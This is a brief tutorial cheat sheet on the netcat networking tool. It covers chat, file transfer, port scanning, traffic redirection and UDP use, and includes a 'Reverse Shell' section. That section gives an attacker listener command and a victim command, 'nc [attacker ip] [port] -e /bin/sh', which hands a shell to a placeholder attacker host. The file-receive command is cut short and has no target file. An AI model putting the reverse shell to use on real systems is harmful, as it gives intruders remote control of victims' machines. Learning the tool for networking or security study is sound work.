# NetCat (nc)
Netcat is a command-line tool that can be used for a variety of tasks, such as:
-creating network connections
-transferring data
-scanning ports and more.
It is often referred to as the "Swiss Army knife" of networking tools because it can be used for so many different purposes.

**Installation**
Netcat is typically pre-installed on many Linux and Unix-based systems. However, it may not be installed on all systems, or you may be using a different operating system such as Windows.

To check if netcat is already installed on your system, open a terminal and type:
nc -v

**Basic Usage**
Creating a Simple Chat Application
To create a simple chat application between two computers, you can use the following command on one computer:
nc -l 1234
And on the other computer:
nc [ip address of first computer] 1234

**File Transfer**
To send a file from one computer to another:
nc -w 3 [ip address] 1234 < [file]
On the receiving end:
nc -l 1234 >

**Port Scanning**
To scan for open ports on a specific IP address or hostname, you can use the following command:
nc -v -n -z [ip address or hostname] [start port]-[end port]

**Redirecting Traffic**
To redirect incoming traffic on one port to another port or IP address, you can use the following command:
nc -l [listening port] -c 'nc [destination ip address] [destination port]'

**Server and Client Mode**
To start netcat in server mode and listen on a specific port, you can use the following command:
nc -l [port number]
To connect to a netcat server running on a specific IP address and port, you can use the following command:
nc [ip address] [port number]

**Reverse Shell**
To create a reverse shell, you can use the following command on the attacker machine:
nc -lvp [port number]
On the victim machine:
nc [attacker ip address] [port number] -e /bin/sh

**Send and receive UDP packets**
To send a UDP packet to a specific IP address and port:
echo "message" | nc -u [ip address] [port number]
To listen for incoming UDP packets on a specific port:
nc -ul [port number]
